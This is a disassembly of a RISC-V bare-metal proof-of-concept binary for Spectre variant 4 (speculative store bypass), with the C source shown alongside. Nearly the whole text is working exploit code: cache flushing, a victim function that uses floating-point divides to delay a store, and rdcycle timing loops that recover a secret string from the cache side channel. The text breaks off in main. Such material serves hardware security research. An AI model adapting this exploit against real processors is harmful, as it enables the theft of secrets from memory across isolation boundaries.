
bin/spectre-v4.riscv：     文件格式 elf64-littleriscv


Disassembly of section .text.init:

0000000080000000 <_start>:
    80000000:	4081                	li	ra,0
    80000002:	4101                	li	sp,0
    80000004:	4181                	li	gp,0
    80000006:	4201                	li	tp,0
    80000008:	4281                	li	t0,0
    8000000a:	4301                	li	t1,0
    8000000c:	4381                	li	t2,0
    8000000e:	4401                	li	s0,0
    80000010:	4481                	li	s1,0
    80000012:	4501                	li	a0,0
    80000014:	4581                	li	a1,0
    80000016:	4601                	li	a2,0
    80000018:	4681                	li	a3,0
    8000001a:	4701                	li	a4,0
    8000001c:	4781                	li	a5,0
    8000001e:	4801                	li	a6,0
    80000020:	4881                	li	a7,0
    80000022:	4901                	li	s2,0
    80000024:	4981                	li	s3,0
    80000026:	4a01                	li	s4,0
    80000028:	4a81                	li	s5,0
    8000002a:	4b01                	li	s6,0
    8000002c:	4b81                	li	s7,0
    8000002e:	4c01                	li	s8,0
    80000030:	4c81                	li	s9,0
    80000032:	4d01                	li	s10,0
    80000034:	4d81                	li	s11,0
    80000036:	4e01                	li	t3,0
    80000038:	4e81                	li	t4,0
    8000003a:	4f01                	li	t5,0
    8000003c:	4f81                	li	t6,0
    8000003e:	62f9                	lui	t0,0x1e
    80000040:	3002a073          	csrs	mstatus,t0
    80000044:	4285                	li	t0,1
    80000046:	02fe                	slli	t0,t0,0x1f
    80000048:	0002d863          	bgez	t0,80000058 <_start+0x58>
    8000004c:	4505                	li	a0,1
    8000004e:	00001297          	auipc	t0,0x1
    80000052:	faa2a923          	sw	a0,-78(t0) # 80001000 <tohost>
    80000056:	bfdd                	j	8000004c <_start+0x4c>
    80000058:	00000297          	auipc	t0,0x0
    8000005c:	09028293          	addi	t0,t0,144 # 800000e8 <_start+0xe8>
    80000060:	30529073          	csrw	mtvec,t0
    80000064:	00301073          	fssr	zero
    80000068:	f0000053          	fmv.w.x	ft0,zero
    8000006c:	f00000d3          	fmv.w.x	ft1,zero
    80000070:	f0000153          	fmv.w.x	ft2,zero
    80000074:	f00001d3          	fmv.w.x	ft3,zero
    80000078:	f0000253          	fmv.w.x	ft4,zero
    8000007c:	f00002d3          	fmv.w.x	ft5,zero
    80000080:	f0000353          	fmv.w.x	ft6,zero
    80000084:	f00003d3          	fmv.w.x	ft7,zero
    80000088:	f0000453          	fmv.w.x	fs0,zero
    8000008c:	f00004d3          	fmv.w.x	fs1,zero
    80000090:	f0000553          	fmv.w.x	fa0,zero
    80000094:	f00005d3          	fmv.w.x	fa1,zero
    80000098:	f0000653          	fmv.w.x	fa2,zero
    8000009c:	f00006d3          	fmv.w.x	fa3,zero
    800000a0:	f0000753          	fmv.w.x	fa4,zero
    800000a4:	f00007d3          	fmv.w.x	fa5,zero
    800000a8:	f0000853          	fmv.w.x	fa6,zero
    800000ac:	f00008d3          	fmv.w.x	fa7,zero
    800000b0:	f0000953          	fmv.w.x	fs2,zero
    800000b4:	f00009d3          	fmv.w.x	fs3,zero
    800000b8:	f0000a53          	fmv.w.x	fs4,zero
    800000bc:	f0000ad3          	fmv.w.x	fs5,zero
    800000c0:	f0000b53          	fmv.w.x	fs6,zero
    800000c4:	f0000bd3          	fmv.w.x	fs7,zero
    800000c8:	f0000c53          	fmv.w.x	fs8,zero
    800000cc:	f0000cd3          	fmv.w.x	fs9,zero
    800000d0:	f0000d53          	fmv.w.x	fs10,zero
    800000d4:	f0000dd3          	fmv.w.x	fs11,zero
    800000d8:	f0000e53          	fmv.w.x	ft8,zero
    800000dc:	f0000ed3          	fmv.w.x	ft9,zero
    800000e0:	f0000f53          	fmv.w.x	ft10,zero
    800000e4:	f0000fd3          	fmv.w.x	ft11,zero
    800000e8:	00000297          	auipc	t0,0x0
    800000ec:	03c28293          	addi	t0,t0,60 # 80000124 <trap_entry>
    800000f0:	30529073          	csrw	mtvec,t0
    800000f4:	00003197          	auipc	gp,0x3
    800000f8:	26c18193          	addi	gp,gp,620 # 80003360 <__global_pointer$>
    800000fc:	0001c217          	auipc	tp,0x1c
    80000100:	bc320213          	addi	tp,tp,-1085 # 8001bcbf <_end+0x3f>
    80000104:	fc027213          	andi	tp,tp,-64
    80000108:	f1402573          	csrr	a0,mhartid
    8000010c:	4585                	li	a1,1
    8000010e:	00b57063          	bleu	a1,a0,8000010e <_start+0x10e>
    80000112:	01151613          	slli	a2,a0,0x11
    80000116:	9232                	add	tp,tp,a2
    80000118:	00150113          	addi	sp,a0,1
    8000011c:	0146                	slli	sp,sp,0x11
    8000011e:	9112                	add	sp,sp,tp
    80000120:	27f0106f          	j	80001b9e <_init>

0000000080000124 <trap_entry>:
    80000124:	716d                	addi	sp,sp,-272
    80000126:	e406                	sd	ra,8(sp)
    80000128:	e80a                	sd	sp,16(sp)
    8000012a:	ec0e                	sd	gp,24(sp)
    8000012c:	f012                	sd	tp,32(sp)
    8000012e:	f416                	sd	t0,40(sp)
    80000130:	f81a                	sd	t1,48(sp)
    80000132:	fc1e                	sd	t2,56(sp)
    80000134:	e0a2                	sd	s0,64(sp)
    80000136:	e4a6                	sd	s1,72(sp)
    80000138:	e8aa                	sd	a0,80(sp)
    8000013a:	ecae                	sd	a1,88(sp)
    8000013c:	f0b2                	sd	a2,96(sp)
    8000013e:	f4b6                	sd	a3,104(sp)
    80000140:	f8ba                	sd	a4,112(sp)
    80000142:	fcbe                	sd	a5,120(sp)
    80000144:	e142                	sd	a6,128(sp)
    80000146:	e546                	sd	a7,136(sp)
    80000148:	e94a                	sd	s2,144(sp)
    8000014a:	ed4e                	sd	s3,152(sp)
    8000014c:	f152                	sd	s4,160(sp)
    8000014e:	f556                	sd	s5,168(sp)
    80000150:	f95a                	sd	s6,176(sp)
    80000152:	fd5e                	sd	s7,184(sp)
    80000154:	e1e2                	sd	s8,192(sp)
    80000156:	e5e6                	sd	s9,200(sp)
    80000158:	e9ea                	sd	s10,208(sp)
    8000015a:	edee                	sd	s11,216(sp)
    8000015c:	f1f2                	sd	t3,224(sp)
    8000015e:	f5f6                	sd	t4,232(sp)
    80000160:	f9fa                	sd	t5,240(sp)
    80000162:	fdfe                	sd	t6,248(sp)
    80000164:	34202573          	csrr	a0,mcause
    80000168:	341025f3          	csrr	a1,mepc
    8000016c:	860a                	mv	a2,sp
    8000016e:	10d010ef          	jal	ra,80001a7a <handle_trap>
    80000172:	34151073          	csrw	mepc,a0
    80000176:	000022b7          	lui	t0,0x2
    8000017a:	8002829b          	addiw	t0,t0,-2048
    8000017e:	3002a073          	csrs	mstatus,t0
    80000182:	60a2                	ld	ra,8(sp)
    80000184:	6142                	ld	sp,16(sp)
    80000186:	61e2                	ld	gp,24(sp)
    80000188:	7202                	ld	tp,32(sp)
    8000018a:	72a2                	ld	t0,40(sp)
    8000018c:	7342                	ld	t1,48(sp)
    8000018e:	73e2                	ld	t2,56(sp)
    80000190:	6406                	ld	s0,64(sp)
    80000192:	64a6                	ld	s1,72(sp)
    80000194:	6546                	ld	a0,80(sp)
    80000196:	65e6                	ld	a1,88(sp)
    80000198:	7606                	ld	a2,96(sp)
    8000019a:	76a6                	ld	a3,104(sp)
    8000019c:	7746                	ld	a4,112(sp)
    8000019e:	77e6                	ld	a5,120(sp)
    800001a0:	680a                	ld	a6,128(sp)
    800001a2:	68aa                	ld	a7,136(sp)
    800001a4:	694a                	ld	s2,144(sp)
    800001a6:	69ea                	ld	s3,152(sp)
    800001a8:	7a0a                	ld	s4,160(sp)
    800001aa:	7aaa                	ld	s5,168(sp)
    800001ac:	7b4a                	ld	s6,176(sp)
    800001ae:	7bea                	ld	s7,184(sp)
    800001b0:	6c0e                	ld	s8,192(sp)
    800001b2:	6cae                	ld	s9,200(sp)
    800001b4:	6d4e                	ld	s10,208(sp)
    800001b6:	6dee                	ld	s11,216(sp)
    800001b8:	7e0e                	ld	t3,224(sp)
    800001ba:	7eae                	ld	t4,232(sp)
    800001bc:	7f4e                	ld	t5,240(sp)
    800001be:	7fee                	ld	t6,248(sp)
    800001c0:	6151                	addi	sp,sp,272
    800001c2:	30200073          	mret

Disassembly of section .tohost:

0000000080001000 <tohost>:
	...

0000000080001040 <fromhost>:
	...

Disassembly of section .text:

0000000080001048 <flushCache>:
 *
 * @param addr starting address to clear the cache
 * @param sz size of the data to remove in bytes
 */
void flushCache(uint64_t addr, uint64_t sz)
{
    80001048:	711d                	addi	sp,sp,-96
    8000104a:	eca2                	sd	s0,88(sp)
    8000104c:	1080                	addi	s0,sp,96
    8000104e:	faa43423          	sd	a0,-88(s0)
    80001052:	fab43023          	sd	a1,-96(s0)
    // printf("Flushed addr(0x%lx) tag(0x%lx) set(0x%lx) off(0x%lx) sz(%ld)\n", addr, (addr & TAG_MASK) >> (L1_SET_BITS + L1_BLOCK_BITS), 
    //                                                                    (addr & SET_MASK) >> L1_BLOCK_BITS, addr & OFF_MASK, sz);

    // find out the amount of blocks you want to clear
    uint64_t numSetsClear = sz >> L1_BLOCK_BITS;
    80001056:	fa043783          	ld	a5,-96(s0)
    8000105a:	8399                	srli	a5,a5,0x6
    8000105c:	fef43423          	sd	a5,-24(s0)
    if ((sz & OFF_MASK) != 0)
    80001060:	fa043783          	ld	a5,-96(s0)
    80001064:	03f7f793          	andi	a5,a5,63
    80001068:	c791                	beqz	a5,80001074 <flushCache+0x2c>
    {
        numSetsClear += 1;
    8000106a:	fe843783          	ld	a5,-24(s0)
    8000106e:	0785                	addi	a5,a5,1
    80001070:	fef43423          	sd	a5,-24(s0)
    }

    if (numSetsClear > L1_SETS)
    80001074:	fe843703          	ld	a4,-24(s0)
    80001078:	04000793          	li	a5,64
    8000107c:	00e7f663          	bleu	a4,a5,80001088 <flushCache+0x40>
    {
        // flush entire cache with no rollover (makes the function finish faster) 
        numSetsClear = L1_SETS;
    80001080:	04000793          	li	a5,64
    80001084:	fef43423          	sd	a5,-24(s0)
    }
    
    //printf("numSetsClear(%ld)\n", numSetsClear);

    // temp variable used for nothing
    uint8_t dummy = 0;
    80001088:	fc040ba3          	sb	zero,-41(s0)

    // this mem address is the start of a contiguous set of memory that will fit inside of the cache
    // thus it has the following properties
    // 1. dummyMem <= alignedMem < dummyMem + sizeof(dummyMem)
    // 2. alignedMem has idx = 0 and offset = 0 
    uint64_t alignedMem = (((uint64_t)dummyMem) + L1_SZ_BYTES) & TAG_MASK;
    8000108c:	00002717          	auipc	a4,0x2
    80001090:	b3470713          	addi	a4,a4,-1228 # 80002bc0 <dummyMem>
    80001094:	6791                	lui	a5,0x4
    80001096:	973e                	add	a4,a4,a5
    80001098:	77fd                	lui	a5,0xfffff
    8000109a:	8ff9                	and	a5,a5,a4
    8000109c:	fcf43423          	sd	a5,-56(s0)
    //printf("alignedMem(0x%lx)\n", alignedMem);
        
    for (uint64_t i = 0; i < numSetsClear; ++i)
    800010a0:	fe043023          	sd	zero,-32(s0)
    800010a4:	a8b9                	j	80001102 <flushCache+0xba>
    {
        // offset to move across the sets that you want to flush
        uint64_t setOffset = (((addr & SET_MASK) >> L1_BLOCK_BITS) + i) << L1_BLOCK_BITS;
    800010a6:	fa843783          	ld	a5,-88(s0)
    800010aa:	8399                	srli	a5,a5,0x6
    800010ac:	03f7f713          	andi	a4,a5,63
    800010b0:	fe043783          	ld	a5,-32(s0)
    800010b4:	97ba                	add	a5,a5,a4
    800010b6:	079a                	slli	a5,a5,0x6
    800010b8:	fcf43023          	sd	a5,-64(s0)
        //printf("setOffset(0x%lx)\n", setOffset);

        // since there are L1_WAYS you need to flush the entire set
        for(uint64_t j = 0; j < 4*L1_WAYS; ++j)   //j < 4*L1_WAYS
    800010bc:	fc043c23          	sd	zero,-40(s0)
    800010c0:	a03d                	j	800010ee <flushCache+0xa6>
        {
            // offset to reaccess the set
            uint64_t wayOffset = j << (L1_BLOCK_BITS + L1_SET_BITS);
    800010c2:	fd843783          	ld	a5,-40(s0)
    800010c6:	07b2                	slli	a5,a5,0xc
    800010c8:	faf43c23          	sd	a5,-72(s0)
            //printf("wayOffset(0x%lx)\n", wayOffset);

            // evict the previous cache block and put in the dummy mem
            dummy = *((uint8_t*)(alignedMem + setOffset + wayOffset));
    800010cc:	fc843703          	ld	a4,-56(s0)
    800010d0:	fc043783          	ld	a5,-64(s0)
    800010d4:	973e                	add	a4,a4,a5
    800010d6:	fb843783          	ld	a5,-72(s0)
    800010da:	97ba                	add	a5,a5,a4
    800010dc:	0007c783          	lbu	a5,0(a5) # fffffffffffff000 <_end+0xffffffff7ffe3380>
    800010e0:	fcf40ba3          	sb	a5,-41(s0)
        for(uint64_t j = 0; j < 4*L1_WAYS; ++j)   //j < 4*L1_WAYS
    800010e4:	fd843783          	ld	a5,-40(s0)
    800010e8:	0785                	addi	a5,a5,1
    800010ea:	fcf43c23          	sd	a5,-40(s0)
    800010ee:	fd843703          	ld	a4,-40(s0)
    800010f2:	47bd                	li	a5,15
    800010f4:	fce7f7e3          	bleu	a4,a5,800010c2 <flushCache+0x7a>
    for (uint64_t i = 0; i < numSetsClear; ++i)
    800010f8:	fe043783          	ld	a5,-32(s0)
    800010fc:	0785                	addi	a5,a5,1
    800010fe:	fef43023          	sd	a5,-32(s0)
    80001102:	fe043703          	ld	a4,-32(s0)
    80001106:	fe843783          	ld	a5,-24(s0)
    8000110a:	f8f76ee3          	bltu	a4,a5,800010a6 <flushCache+0x5e>
            //printf("evict read(0x%lx)\n", alignedMem + setOffset + wayOffset);
        }
    }
}
    8000110e:	0001                	nop
    80001110:	6466                	ld	s0,88(sp)
    80001112:	6125                	addi	sp,sp,96
    80001114:	8082                	ret

0000000080001116 <topTwoIdx>:
 * @input inArraySize size of the inArray array in entries
 * @inout outIdxArray array holding the idxs of the top two values
 *        ([0] idx has the larger value in inArray array)
 * @inout outValArray array holding the top two values ([0] has the larger value)
 */
void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
    80001116:	7139                	addi	sp,sp,-64
    80001118:	fc22                	sd	s0,56(sp)
    8000111a:	0080                	addi	s0,sp,64
    8000111c:	fca43c23          	sd	a0,-40(s0)
    80001120:	fcb43823          	sd	a1,-48(s0)
    80001124:	fcc43423          	sd	a2,-56(s0)
    80001128:	fcd43023          	sd	a3,-64(s0)
    outValArray[0] = 0;
    8000112c:	fc043783          	ld	a5,-64(s0)
    80001130:	0007b023          	sd	zero,0(a5)
    outValArray[1] = 0;
    80001134:	fc043783          	ld	a5,-64(s0)
    80001138:	07a1                	addi	a5,a5,8
    8000113a:	0007b023          	sd	zero,0(a5)

    for (uint64_t i = 0; i < inArraySize; ++i){
    8000113e:	fe043423          	sd	zero,-24(s0)
    80001142:	a075                	j	800011ee <topTwoIdx+0xd8>
        if (inArray[i] > outValArray[0]){
    80001144:	fe843783          	ld	a5,-24(s0)
    80001148:	078e                	slli	a5,a5,0x3
    8000114a:	fd843703          	ld	a4,-40(s0)
    8000114e:	97ba                	add	a5,a5,a4
    80001150:	6398                	ld	a4,0(a5)
    80001152:	fc043783          	ld	a5,-64(s0)
    80001156:	639c                	ld	a5,0(a5)
    80001158:	04e7f563          	bleu	a4,a5,800011a2 <topTwoIdx+0x8c>
            outValArray[1] = outValArray[0];
    8000115c:	fc043783          	ld	a5,-64(s0)
    80001160:	07a1                	addi	a5,a5,8
    80001162:	fc043703          	ld	a4,-64(s0)
    80001166:	6318                	ld	a4,0(a4)
    80001168:	e398                	sd	a4,0(a5)
            outValArray[0] = inArray[i];
    8000116a:	fe843783          	ld	a5,-24(s0)
    8000116e:	078e                	slli	a5,a5,0x3
    80001170:	fd843703          	ld	a4,-40(s0)
    80001174:	97ba                	add	a5,a5,a4
    80001176:	6398                	ld	a4,0(a5)
    80001178:	fc043783          	ld	a5,-64(s0)
    8000117c:	e398                	sd	a4,0(a5)
            outIdxArray[1] = outIdxArray[0];
    8000117e:	fc843783          	ld	a5,-56(s0)
    80001182:	0785                	addi	a5,a5,1
    80001184:	fc843703          	ld	a4,-56(s0)
    80001188:	00074703          	lbu	a4,0(a4)
    8000118c:	00e78023          	sb	a4,0(a5)
            outIdxArray[0] = i;
    80001190:	fe843783          	ld	a5,-24(s0)
    80001194:	0ff7f713          	andi	a4,a5,255
    80001198:	fc843783          	ld	a5,-56(s0)
    8000119c:	00e78023          	sb	a4,0(a5)
    800011a0:	a091                	j	800011e4 <topTwoIdx+0xce>
        }
        else if (inArray[i] > outValArray[1]){
    800011a2:	fe843783          	ld	a5,-24(s0)
    800011a6:	078e                	slli	a5,a5,0x3
    800011a8:	fd843703          	ld	a4,-40(s0)
    800011ac:	97ba                	add	a5,a5,a4
    800011ae:	6398                	ld	a4,0(a5)
    800011b0:	fc043783          	ld	a5,-64(s0)
    800011b4:	07a1                	addi	a5,a5,8
    800011b6:	639c                	ld	a5,0(a5)
    800011b8:	02e7f663          	bleu	a4,a5,800011e4 <topTwoIdx+0xce>
            outValArray[1] = inArray[i];
    800011bc:	fe843783          	ld	a5,-24(s0)
    800011c0:	078e                	slli	a5,a5,0x3
    800011c2:	fd843703          	ld	a4,-40(s0)
    800011c6:	973e                	add	a4,a4,a5
    800011c8:	fc043783          	ld	a5,-64(s0)
    800011cc:	07a1                	addi	a5,a5,8
    800011ce:	6318                	ld	a4,0(a4)
    800011d0:	e398                	sd	a4,0(a5)
            outIdxArray[1] = i;
    800011d2:	fc843783          	ld	a5,-56(s0)
    800011d6:	0785                	addi	a5,a5,1
    800011d8:	fe843703          	ld	a4,-24(s0)
    800011dc:	0ff77713          	andi	a4,a4,255
    800011e0:	00e78023          	sb	a4,0(a5)
    for (uint64_t i = 0; i < inArraySize; ++i){
    800011e4:	fe843783          	ld	a5,-24(s0)
    800011e8:	0785                	addi	a5,a5,1
    800011ea:	fef43423          	sd	a5,-24(s0)
    800011ee:	fe843703          	ld	a4,-24(s0)
    800011f2:	fd043783          	ld	a5,-48(s0)
    800011f6:	f4f767e3          	bltu	a4,a5,80001144 <topTwoIdx+0x2e>
        }
    }
}
    800011fa:	0001                	nop
    800011fc:	7462                	ld	s0,56(sp)
    800011fe:	6121                	addi	sp,sp,64
    80001200:	8082                	ret

0000000080001202 <victim_function>:
uint64_t   temp = 0;
uint8_t    dummy = 2;
uint64_t   str[256];
uint64_t   div = 2;
void victim_function(uint64_t idx)
{
    80001202:	7179                	addi	sp,sp,-48
    80001204:	f422                	sd	s0,40(sp)
    80001206:	1800                	addi	s0,sp,48
    80001208:	fca43c23          	sd	a0,-40(s0)
    str[1] = idx;
    8000120c:	0001a797          	auipc	a5,0x1a
    80001210:	a3478793          	addi	a5,a5,-1484 # 8001ac40 <str>
    80001214:	fd843703          	ld	a4,-40(s0)
    80001218:	e798                	sd	a4,8(a5)
    // stall str_index by doing div operations (operation is (str_index << 4) / (2**4))
    // empirical and after test, 1 division operations is much better than more
    str_index =  str_index << 8;             //str_index = 2
    8000121a:	81018793          	addi	a5,gp,-2032 # 80002b70 <str_index>
    8000121e:	639c                	ld	a5,0(a5)
    80001220:	00879713          	slli	a4,a5,0x8
    80001224:	81018793          	addi	a5,gp,-2032 # 80002b70 <str_index>
    80001228:	e398                	sd	a4,0(a5)
    asm("fcvt.s.lu	fa4, %[in]\n"            //fa4=2.0
    8000122a:	81018793          	addi	a5,gp,-2032 # 80002b70 <str_index>
    8000122e:	639c                	ld	a5,0(a5)
    80001230:	82018713          	addi	a4,gp,-2016 # 80002b80 <div>
    80001234:	6318                	ld	a4,0(a4)
    80001236:	d0377753          	fcvt.s.lu	fa4,a4
    8000123a:	d037f7d3          	fcvt.s.lu	fa5,a5
    8000123e:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001242:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001246:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    8000124a:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    8000124e:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001252:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    80001256:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    8000125a:	18e7f7d3          	fdiv.s	fa5,fa5,fa4
    8000125e:	c0379753          	fcvt.lu.s	a4,fa5,rtz
    80001262:	81018793          	addi	a5,gp,-2032 # 80002b70 <str_index>
    80001266:	e398                	sd	a4,0(a5)
        "fdiv.s	fa5, fa5, fa4\n"
        "fcvt.lu.s	%[out], fa5, rtz\n"     //single precise floating point to long unsign int, str_index = 1
        : [out] "=r" (str_index)
        : [inout] "r" (str_index), [in] "r" (div)
        : "fa4", "fa5");
    str[str_index] = 0;
    80001268:	81018793          	addi	a5,gp,-2032 # 80002b70 <str_index>
    8000126c:	639c                	ld	a5,0(a5)
    8000126e:	0001a717          	auipc	a4,0x1a
    80001272:	9d270713          	addi	a4,a4,-1582 # 8001ac40 <str>
    80001276:	078e                	slli	a5,a5,0x3
    80001278:	97ba                	add	a5,a5,a4
    8000127a:	0007b023          	sd	zero,0(a5)
    temp &= array2[array1[str[1]] * L1_BLOCK_SZ_BYTES];
    8000127e:	0001a797          	auipc	a5,0x1a
    80001282:	9c278793          	addi	a5,a5,-1598 # 8001ac40 <str>
    80001286:	679c                	ld	a5,8(a5)
    80001288:	00002717          	auipc	a4,0x2
    8000128c:	83870713          	addi	a4,a4,-1992 # 80002ac0 <array1>
    80001290:	97ba                	add	a5,a5,a4
    80001292:	0007c783          	lbu	a5,0(a5)
    80001296:	2781                	sext.w	a5,a5
    80001298:	0067979b          	slliw	a5,a5,0x6
    8000129c:	2781                	sext.w	a5,a5
    8000129e:	00016717          	auipc	a4,0x16
    800012a2:	9a270713          	addi	a4,a4,-1630 # 80016c40 <array2>
    800012a6:	97ba                	add	a5,a5,a4
    800012a8:	0007c783          	lbu	a5,0(a5)
    800012ac:	873e                	mv	a4,a5
    800012ae:	00002797          	auipc	a5,0x2
    800012b2:	8da78793          	addi	a5,a5,-1830 # 80002b88 <temp>
    800012b6:	639c                	ld	a5,0(a5)
    800012b8:	8f7d                	and	a4,a4,a5
    800012ba:	00002797          	auipc	a5,0x2
    800012be:	8ce78793          	addi	a5,a5,-1842 # 80002b88 <temp>
    800012c2:	e398                	sd	a4,0(a5)
    // bound speculation here just in case it goes over
    dummy = rdcycle();
    800012c4:	c00027f3          	rdcycle	a5
    800012c8:	fef43423          	sd	a5,-24(s0)
    800012cc:	fe843783          	ld	a5,-24(s0)
    800012d0:	0ff7f713          	andi	a4,a5,255
    800012d4:	81818793          	addi	a5,gp,-2024 # 80002b78 <dummy>
    800012d8:	00e78023          	sb	a4,0(a5)
}
    800012dc:	0001                	nop
    800012de:	7422                	ld	s0,40(sp)
    800012e0:	6145                	addi	sp,sp,48
    800012e2:	8082                	ret

00000000800012e4 <main>:


int main(void)
{
    800012e4:	7175                	addi	sp,sp,-144
    800012e6:	e506                	sd	ra,136(sp)
    800012e8:	e122                	sd	s0,128(sp)
    800012ea:	0900                	addi	s0,sp,144
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    800012ec:	00002797          	auipc	a5,0x2
    800012f0:	87c78793          	addi	a5,a5,-1924 # 80002b68 <secretString>
    800012f4:	639c                	ld	a5,0(a5)
    800012f6:	873e                	mv	a4,a5
    800012f8:	00001797          	auipc	a5,0x1
    800012fc:	7c878793          	addi	a5,a5,1992 # 80002ac0 <array1>
    80001300:	40f707b3          	sub	a5,a4,a5
    80001304:	fef43423          	sd	a5,-24(s0)
    uint64_t start, diff;
    static uint64_t results[256];

    printf("================= This is a POC of spectre_v4 (Store Bypass) ========================= \n");
    80001308:	00001517          	auipc	a0,0x1
    8000130c:	4d850513          	addi	a0,a0,1240 # 800027e0 <atol+0x100>
    80001310:	7a9000ef          	jal	ra,800022b8 <printf>
    printf("the secret key is:%s \n", secretString);
    80001314:	00002797          	auipc	a5,0x2
    80001318:	85478793          	addi	a5,a5,-1964 # 80002b68 <secretString>
    8000131c:	639c                	ld	a5,0(a5)
    8000131e:	85be                	mv	a1,a5
    80001320:	00001517          	auipc	a0,0x1
    80001324:	52050513          	addi	a0,a0,1312 # 80002840 <atol+0x160>
    80001328:	791000ef          	jal	ra,800022b8 <printf>

    // try to read out the secret
    for(uint64_t len = 0; len < SECRET_SZ; ++len)
    8000132c:	fe043023          	sd	zero,-32(s0)
    80001330:	ac15                	j	80001564 <main+0x280>
	{

        // clear results every round
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx)
    80001332:	fc043c23          	sd	zero,-40(s0)
    80001336:	a005                	j	80001356 <main+0x72>
		{
            results[cIdx] = 0;
    80001338:	0001a717          	auipc	a4,0x1a
    8000133c:	10870713          	addi	a4,a4,264 # 8001b440 <results.2500>
    80001340:	fd843783          	ld	a5,-40(s0)
    80001344:	078e                	slli	a5,a5,0x3
    80001346:	97ba                	add	a5,a5,a4
    80001348:	0007b023          	sd	zero,0(a5)
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx)
    8000134c:	fd843783          	ld	a5,-40(s0)
    80001350:	0785                	addi	a5,a5,1
    80001352:	fcf43c23          	sd	a5,-40(s0)
    80001356:	fd843703          	ld	a4,-40(s0)
    8000135a:	0ff00793          	li	a5,255
    8000135e:	fce7fde3          	bleu	a4,a5,80001338 <main+0x54>
        }

        // run the attack on the same idx ATTACK_SAME_ROUNDS times
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound)
    80001362:	fc043823          	sd	zero,-48(s0)
    80001366:	a0e9                	j	80001430 <main+0x14c>
		{

            // make sure array you read from is not in the cache
            flushCache((uint64_t)array2, sizeof(array2));
    80001368:	00016797          	auipc	a5,0x16
    8000136c:	8d878793          	addi	a5,a5,-1832 # 80016c40 <array2>
    80001370:	6591                	lui	a1,0x4
    80001372:	853e                	mv	a0,a5
    80001374:	cd5ff0ef          	jal	ra,80001048 <flushCache>
            victim_function(attackIdx);
    80001378:	fe843503          	ld	a0,-24(s0)
    8000137c:	e87ff0ef          	jal	ra,80001202 <victim_function>

            // read out array 2 and see the hit secret value
            // this is also assuming there is no prefetching
            for (uint64_t i = 0; i < 256; ++i)
    80001380:	fc043423          	sd	zero,-56(s0)
    80001384:	a859                	j	8000141a <main+0x136>
            {
                uint64_t  uiTemp = 0;  //introduced a dummy variable to prevent compiler optimizations
    80001386:	fc043023          	sd	zero,-64(s0)
                start = rdcycle();
    8000138a:	c00027f3          	rdcycle	a5
    8000138e:	faf43c23          	sd	a5,-72(s0)
    80001392:	fb843783          	ld	a5,-72(s0)
    80001396:	faf43823          	sd	a5,-80(s0)
                dummy &= array2[i * L1_BLOCK_SZ_BYTES];
    8000139a:	fc843783          	ld	a5,-56(s0)
    8000139e:	079a                	slli	a5,a5,0x6
    800013a0:	00016717          	auipc	a4,0x16
    800013a4:	8a070713          	addi	a4,a4,-1888 # 80016c40 <array2>
    800013a8:	97ba                	add	a5,a5,a4
    800013aa:	0007c703          	lbu	a4,0(a5)
    800013ae:	81818793          	addi	a5,gp,-2024 # 80002b78 <dummy>
    800013b2:	0007c783          	lbu	a5,0(a5)
    800013b6:	8ff9                	and	a5,a5,a4
    800013b8:	0ff7f713          	andi	a4,a5,255
    800013bc:	81818793          	addi	a5,gp,-2024 # 80002b78 <dummy>
    800013c0:	00e78023          	sb	a4,0(a5)
                diff = (rdcycle() - start);
    800013c4:	c00027f3          	rdcycle	a5
    800013c8:	faf43423          	sd	a5,-88(s0)
    800013cc:	fa843703          	ld	a4,-88(s0)
    800013d0:	fb043783          	ld	a5,-80(s0)
    800013d4:	40f707b3          	sub	a5,a4,a5
    800013d8:	faf43023          	sd	a5,-96(s0)

                if ( diff < CACHE_HIT_THRESHOLD )
    800013dc:	fa043703          	ld	a4,-96(s0)
    800013e0:	03100793          	li	a5,49
    800013e4:	02e7e663          	bltu	a5,a4,80001410 <main+0x12c>
				{
					// printf("len=%ld, atkRound=%ld, add 1 to results[%ld], diff=%lu \n", len, atkRound, i, diff);
                    results[i] += 1;
    800013e8:	0001a717          	auipc	a4,0x1a
    800013ec:	05870713          	addi	a4,a4,88 # 8001b440 <results.2500>
    800013f0:	fc843783          	ld	a5,-56(s0)
    800013f4:	078e                	slli	a5,a5,0x3
    800013f6:	97ba                	add	a5,a5,a4
    800013f8:	639c                	ld	a5,0(a5)
    800013fa:	00178713          	addi	a4,a5,1
    800013fe:	0001a697          	auipc	a3,0x1a
    80001402:	04268693          	addi	a3,a3,66 # 8001b440 <results.2500>
    80001406:	fc843783          	ld	a5,-56(s0)
    8000140a:	078e                	slli	a5,a5,0x3
    8000140c:	97b6                	add	a5,a5,a3
    8000140e:	e398                	sd	a4,0(a5)
            for (uint64_t i = 0; i < 256; ++i)
    80001410:	fc843783          	ld	a5,-56(s0)
    80001414:	0785                	addi	a5,a5,1
    80001416:	fcf43423          	sd	a5,-56(s0)
    8000141a:	fc843703          	ld	a4,-56(s0)
    8000141e:	0ff00793          	li	a5,255
    80001422:	f6e7f2e3          	bleu	a4,a5,80001386 <main+0xa2>
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound)
    80001426:	fd043783          	ld	a5,-48(s0)
    8000142a:	0785                	addi	a5,a5,1
    8000142c:	fcf43823          	sd	a5,-48(s0)
    80001430:	fd043703          	ld	a4,-48(s0)
    80001434:	47a5                	li	a5,9
    80001436:	f2e7f9e3          	bleu	a4,a5,80001368 <main+0x84>
        }

        // get highest and second highest result hit values
        uint8_t output[2];
        uint64_t hitArray[2];
        topTwoIdx(results, 256, output, hitArray);
    8000143a:	f8840713          	addi	a4,s0,-120
    8000143e:	f9840793          	addi	a5,s0,-104
    80001442:	86ba                	mv	a3,a4
    80001444:	863e                	mv	a2,a5
    80001446:	10000593          	li	a1,256
    8000144a:	0001a517          	auipc	a0,0x1a
    8000144e:	ff650513          	addi	a0,a0,-10 # 8001b440 <results.2500>
